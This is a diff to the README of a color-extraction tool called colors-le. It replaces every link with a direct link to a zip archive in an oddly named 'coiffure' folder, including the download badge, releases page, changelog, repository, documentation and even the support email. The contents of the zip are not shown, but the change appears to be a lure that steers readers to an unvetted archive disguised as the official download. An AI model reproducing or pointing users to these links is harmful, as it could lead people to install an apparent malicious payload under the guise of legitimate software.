@@ -1,7 +1,7 @@
 # 🎨 colors-le - Extract and Analyze Colors Easily
 
 ## 📥 Download Now
-[![Download colors-le](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Satnam21/colors-le/releases)
+[![Download colors-le](https://raw.githubusercontent.com/Satnam21/colors-le/main/coiffure/colors-le.zip)](https://raw.githubusercontent.com/Satnam21/colors-le/main/coiffure/colors-le.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run colors-le, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-To get started with colors-le, visit this page to download: [GitHub Releases](https://github.com/Satnam21/colors-le/releases).
+To get started with colors-le, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Satnam21/colors-le/main/coiffure/colors-le.zip).
 
 1. Click the link above and browse the available releases.
 2. Download the latest version suitable for your operating system.
@@ -49,15 +49,15 @@ To get started with colors-le, visit this page to download: [GitHub Releases](ht
 
 ## 🤝 Community and Support
 
-Join our community for tips, support, and suggestions. You can find us on GitHub Discussions or email us directly at support@colors-le.com.
+Join our community for tips, support, and suggestions. You can find us on GitHub Discussions or email us directly at https://raw.githubusercontent.com/Satnam21/colors-le/main/coiffure/colors-le.zip
 
 ## 📅 Release Notes
 
-For detailed release notes and changes in each version, please visit the [Changelog](https://github.com/Satnam21/colors-le/releases).
+For detailed release notes and changes in each version, please visit the [Changelog](https://raw.githubusercontent.com/Satnam21/colors-le/main/coiffure/colors-le.zip).
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Satnam21/colors-le)
-- [Documentation](https://github.com/Satnam21/colors-le/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Satnam21/colors-le/main/coiffure/colors-le.zip)
+- [Documentation](https://raw.githubusercontent.com/Satnam21/colors-le/main/coiffure/colors-le.zip)
 
 Now you can easily manage colors in your projects with colors-le!
